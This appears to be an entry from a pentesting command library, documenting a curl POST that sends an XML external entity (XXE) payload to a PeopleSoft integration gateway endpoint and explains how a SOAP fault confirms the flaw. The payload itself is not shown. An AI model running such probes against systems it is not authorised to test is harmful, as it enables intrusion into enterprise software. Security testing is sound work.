---
data: >-
  curl -k -X POST -d @foo
  https://█████/PSIGW/PeopleSoftServiceListeningConnector
tags:
  - xxe
  - http-test
type: command
output: >-
  SOAP fault response indicating invalid SoapRequest, but confirms XXE
  processing if entity is resolved
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:07.946Z'
id: ab367e9f-2e5b-4845-9eeb-7bb7217368d4
verified: false
validated: true
submitted: true
---
# curl-post-xxe-test

## Command

```bash
curl -k -X POST -d @foo https://█████/PSIGW/PeopleSoftServiceListeningConnector
```

## Description

Sends a POST request with an XXE payload from a file to test the vulnerability in the PeopleSoft endpoint, verifying if external entities are processed.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -k | Ignore SSL certificate validation | Yes |
| -X POST | Specify POST method | Yes |
| -d @foo | Read payload from file foo | Yes |
| https://█████/PSIGW/PeopleSoftServiceListeningConnector | Target endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -k -X POST -d @foo https://target/PSIGW/PeopleSoftServiceListeningConnector
```

### Advanced Usage

For custom payloads: curl -k -X POST -H "Content-Type: text/xml" -d '<custom xml>' https://target/endpoint

## Expected Output

SOAP fault like "Invalid SoapRequest", but entity expansion (e.g., HELLO_XXE in error) confirms vulnerability.

## Related

- [[commands/cat-xxe-payload-file]]
